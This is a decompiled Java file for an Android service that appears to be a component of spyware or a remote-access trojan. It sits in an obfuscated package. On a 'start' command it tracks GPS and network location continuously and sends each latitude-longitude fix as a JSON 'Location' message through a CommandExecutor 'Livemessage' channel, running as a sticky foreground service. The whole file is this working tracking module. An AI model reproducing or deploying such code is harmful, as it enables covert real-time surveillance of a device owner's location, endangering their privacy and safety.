/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.location.Location
 *  android.location.LocationListener
 *  android.location.LocationManager
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.IBinder
 *  org.json.JSONException
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import androidx.core.app.ActivityCompat;
import linker.resourcer.encoder.CommandExecutor;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.NotificationBuilder;
import linker.resourcer.encoder.CommandConstants;
import org.json.JSONException;
import org.json.JSONObject;

public class LocationTrackingService
extends Service {
    private static int Notifi_ID = 111;
    private boolean isActive = false;
    private LocationListener myLoListener;
    private LocationManager myLoManager;

    private void startForegroundService(Context context) {
        try {
            context = NotificationBuilder.getInstance(context).createNotification(context);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, (Notification)context, 8);
            } else {
                this.startForeground(Notifi_ID, (Notification)context);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private void startLocationTracking() {
        if (this.isActive) {
            return;
        }
        this.isActive = true;
        this.myLoManager = (LocationManager)this.getSystemService("location");
        this.myLoListener = new LocationListener(this){
            final LocationTrackingService this$0;
            {
                this.this$0 = vntkbrdpzqkqrlwecwifkuwidib2;
            }

            public void onLocationChanged(Location object) {
                if (!this.this$0.isActive) {
                    return;
                }
                double d = object.getLatitude();
                double d2 = object.getLongitude();
                AndroidLogger.Debug("test location:", d + " ---- " + d2);
                try {
                    object = new JSONObject();
                    object.put("type", (Object)CommandConstants.Location);
                    object.put("ltd", d);
                    object.put("lgd", d2);
                    object = object.toString();
                    CommandExecutor.instance(this.this$0.getApplicationContext()).Livemessage(this.this$0.getApplicationContext(), (String)object);
                }
                catch (JSONException jSONException) {
                    jSONException.printStackTrace();
                }
            }

            public void onProviderDisabled(String string2) {
            }

            public void onProviderEnabled(String string2) {
            }

            public void onStatusChanged(String string2, int n, Bundle bundle) {
            }
        };
        if (ActivityCompat.checkSelfPermission(this.getApplicationContext(), "android.permission.ACCESS_FINE_LOCATION") == 0) {
            this.myLoManager.requestLocationUpdates("gps", 0L, 0.0f, this.myLoListener);
            this.myLoManager.requestLocationUpdates("network", 0L, 0.0f, this.myLoListener);
        }
    }

    private void stopLocationTracking() {
        this.isActive = false;
        if (this.myLoManager != null && this.myLoListener != null) {
            this.myLoManager.removeUpdates(this.myLoListener);
            this.myLoListener = null;
        }
        this.stopForeground(false);
        this.stopSelf();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
        this.stopLocationTracking();
        super.onDestroy();
    }

    public int onStartCommand(Intent object, int n, int n2) {
        if ("start".equals(object = object != null ? object.getAction() : null)) {
            this.startForegroundService(this.getApplicationContext());
            this.startLocationTracking();
        } else if ("stop".equals(object)) {
            this.stopLocationTracking();
        }
        return 1;
    }
}

